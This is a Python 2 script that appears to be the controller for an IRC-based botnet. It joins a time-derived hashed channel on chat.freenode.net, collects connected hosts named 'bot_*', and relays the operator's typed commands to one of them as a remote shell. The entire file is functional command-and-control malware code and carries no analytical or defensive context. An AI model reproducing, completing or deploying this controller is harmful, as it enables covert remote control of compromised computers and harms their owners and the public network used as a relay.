import sys
import socket
import string
import time
import select
import math
import fcntl
import os

channel_bot_names = set()
current_shell = None
fd = sys.stdin.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
irc_host = "chat.freenode.net"
irc_port = 6667
max_channel_age = 100000
irc_nick = "candc"
channel = "#holpgknlxo"



def get_channel_number():
    return int(math.floor(time.time())) / max_channel_age

def simple_hash(a):
    prime = 32416189063
    mult = 569059615
    return (a * mult) % prime


def generate_channel_name():
    num = get_channel_number()
    bit_a = simple_hash(num)
    bit_b = simple_hash(bit_a)
    bit_c = simple_hash(bit_b)
    bit_d = simple_hash(bit_c)
    bit_e = simple_hash(bit_d)
    char_1 = bit_b & ((2**32) - 1)
    char_2 = bit_c & ((2**32) - 1)
    char_3 = bit_d & ((2**32) - 1)
    char_4 = bit_e & ((2**32) - 1)
    return ("#%08x%08x%08x%08x" % (char_1, char_2, char_3, char_4))

def irc_receive(irc_socket):
    if (irc_socket == None):
        setup_irc()
    is_ready = select.select([irc_socket], [], [], 1)
    if not is_ready[0]:
        return []
    buffered_lines = irc_socket.recv(8192)
    lines = buffered_lines.split("\n")
    lines = [str(l).strip() for l in lines if str(l).strip() != '']
    return lines

def irc_parse_line(line):
    global channel_bot_names
    # ALSO RESPOND TO PINGS
    names_sep = "@ " + channel + " :"
    name_splits = line.split(names_sep, 1)
    if len(name_splits) == 2:
        names = name_splits[1].split(" ")
        # uniquely all the bots to the list
        channel_bot_names = channel_bot_names.union([name for name in names if name.startswith("bot_")])
        return None
    priv_msg_sep = "PRIVMSG " + irc_nick + " :"
    priv_splits = line.split(priv_msg_sep, 1)
    if len(priv_splits) == 2:
        return priv_splits[1]
    pub_msg_sep = "PRIVMSG " + channel + " :"
    pub_splits = line.split(pub_msg_sep, 1)
    if len(pub_splits) == 1:
        #print("Rejecting %s" % line)
        return None
    return pub_splits[1]

def irc_parse_all_lines(lines):
    return filter(None, [irc_parse_line(line) for line in lines])

def irc_send(irc_socket, msg):
    if (irc_socket == None):
        setup_irc()
    print("> " + msg) # maybe not desirable behavior
    irc_socket.send(msg + "\r\n")

def irc_channel_send(irc_socket, msg):
    irc_send(irc_socket, "PRIVMSG %s :%s" % (channel, msg))

def setup_irc():
    irc_socket = socket.socket()
    irc_socket.connect((irc_host, irc_port))
    irc_socket.setblocking(0)
    irc_send(irc_socket, "NICK %s" % irc_nick)
    irc_send(irc_socket, "USER %s %s %s :%s" % (irc_nick, irc_nick, irc_nick, irc_nick))
    irc_send(irc_socket, "PRIVMSG R : Login <>")
    irc_send(irc_socket, "MODE %s + x" % irc_nick)
    irc_send(irc_socket, "JOIN %s" % channel)
    return irc_socket

def shell_private_message(irc_socket, msg):
    irc_send(irc_socket, "PRIVMSG %s :%s" % (current_shell, msg))

def close_bot_shell(irc_socket):
    global current_shell
    if not current_shell:
        return
    # announce shell closure
    shell_private_message(irc_socket, "SH CLOSE")
    current_shell = None

def open_bot_shell(irc_socket):
    global channel_bot_names
    global current_shell
    if current_shell:
        return
    # picks a random bot from the available pool in the channel

    # repopulate list of bots
    channel_bot_names = set()
    irc_send(irc_socket, "NAMES %s" % channel)
    received = irc_receive(irc_socket)
    received = irc_parse_all_lines(received)
    out = "\n".join(received)
    if out:
        print out

    # supposedly we now have a list of bots
    if (len(channel_bot_names)):
        current_shell = list(channel_bot_names)[0] # should be able to choose
        print "Found bot " + current_shell
        # announce shell construction to bot
        shell_private_message(irc_socket, "SH OPEN")



def process_shell_line(irc_socket, line):
    if line.startswith("CLOSE"):
        close_bot_shell(irc_socket)
    elif line.startswith("OPEN"):
        open_bot_shell(irc_socket)
    elif (current_shell):
        shell_private_message(irc_socket, line)

def process_line(irc_socket, line):
    # maybe want to do fancier stuff here
    if line.startswith("SH "):
        process_shell_line(irc_socket, line[3:])
    else:
        irc_channel_send(irc_socket, line)

if __name__ == "__main__":
    channel = generate_channel_name()
    irc_socket = setup_irc()
    irc_channel_send(irc_socket, "Hello.")
    while True:
        try:
            line = sys.stdin.readline()
            process_line(irc_socket, line)
        except IOError:
            pass
        received = irc_receive(irc_socket)
        received = irc_parse_all_lines(received)
        out = "\n".join(received)
        if out:
             print out
